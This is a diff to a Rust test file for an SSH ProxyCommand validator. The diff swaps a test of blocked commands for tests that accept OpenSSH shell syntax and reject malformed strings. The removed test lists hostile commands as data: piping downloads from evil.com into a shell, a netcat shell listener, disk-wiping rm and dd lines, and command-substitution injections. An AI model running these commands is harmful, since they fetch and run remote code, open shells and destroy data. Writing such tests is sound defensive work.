@@ -33,32 +33,26 @@ fn test_validate_executable_string_legitimate() {
 }
 
 #[test]
-fn test_validate_executable_string_malicious() {
-    // Test malicious commands that should be blocked
-    let malicious_commands = vec![
-        "ssh -W %h:%p gateway.example.com; rm -rf /",
-        "ssh -W %h:%p gateway.example.com | bash",
-        "ssh -W %h:%p gateway.example.com & curl evil.com",
-        "ssh -W %h:%p `whoami`",
-        "ssh -W %h:%p $(whoami)",
-        "curl http://evil.com/malware.sh | bash",
-        "wget -O - http://evil.com/script | sh",
-        "nc -l 4444 -e /bin/sh",
-        "rm -rf /important/files",
-        "dd if=/dev/zero of=/dev/sda",
-    ];
-
-    for cmd in malicious_commands {
-        let result = validate_executable_string(cmd, "ProxyCommand", 1);
+fn test_proxy_command_allows_openssh_shell_syntax() {
+    for command in [
+        "nc proxy.example.com 22 | cat",
+        "exec ssh -W %h:%p gateway.example.com",
+        "sh -c 'connect %h %p'",
+        "printf data > /tmp/proxy-input && cat /tmp/proxy-input",
+    ] {
         assert!(
-            result.is_err(),
-            "Malicious command should be blocked: {cmd}"
+            validate_executable_string(command, "ProxyCommand", 1).is_ok(),
+            "OpenSSH-compatible shell command should pass: {command}"
         );
+    }
+}
 
-        let error = result.unwrap_err().to_string();
+#[test]
+fn test_proxy_command_rejects_invalid_structure() {
+    for command in ["echo %x", "echo %", "echo\0bad", "echo\nbad"] {
         assert!(
-            error.contains("Security violation"),
-            "Error should mention security violation for: {cmd}. Got: {error}"
+            validate_executable_string(command, "ProxyCommand", 1).is_err(),
+            "structurally invalid command should fail: {command:?}"
         );
     }
 }
